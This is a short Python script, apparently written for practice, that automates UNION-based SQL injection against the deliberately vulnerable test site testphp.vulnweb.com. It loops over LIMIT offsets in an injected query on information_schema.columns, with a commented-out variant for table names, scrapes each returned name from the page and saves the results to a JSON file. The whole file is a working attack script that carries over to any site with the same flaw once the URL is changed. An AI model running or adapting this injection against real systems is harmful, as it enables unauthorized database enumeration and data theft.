import requests
from bs4 import BeautifulSoup
import json
import time
import os



# target_url = "http://testphp.vulnweb.com/product.php?pic=0 union select 1,2,3,4,5,6,table_name,8,9,10,11 from information_schema.tables limit {},1"
# limit_target = 86
target_url = "http://testphp.vulnweb.com/product.php?pic=0 union select 1,2,3,4,5,6,column_name,8,9,10,11 from information_schema.columns limit {},1"
limit_target = 460
data = []
file_name = "./columns_name.json"

if os.path.exists(file_name):
    with open(file_name,"r") as file:
        list_data = json.load(file)
        last_index= list_data[-1]['id']
else:
    last_index = 0



for index in range(last_index,limit_target):
    retry = 0
    success = False
    while retry < 3 and not success:
        url = target_url.format(index)
        response = requests.get(url)
        if response.status_code != 200:
            print(f"Request Failed with status code : {response.status_code}.Retrying ....")
            retry += 1
            time.sleep(4)
            continue
        
        soup = BeautifulSoup(response.content,'html.parser')
        table_name_h = soup.find('h2',id="pageName")
        if table_name_h :
            table_name_h = table_name_h.get_text(strip=True)
            data.append({
                'id' : index,
                'columns_name' : table_name_h
            })
            success = True
            print(f"finsih add {index}")
        else :
            print(f"Table name contnet not found for limit : {index}.Retrying ....")
            retry += 1
            time.sleep(4)

if os.path.exists(file_name):
    with open(file_name,"r") as file:
        list_data = json.load(file)
        list_data.extend(data)
else:
    list_data = data


with open(file_name,"w") as file:
    json.dump(list_data,file,indent=4)
print(f"Scraping completed.Total item collection : {len(list_data)}")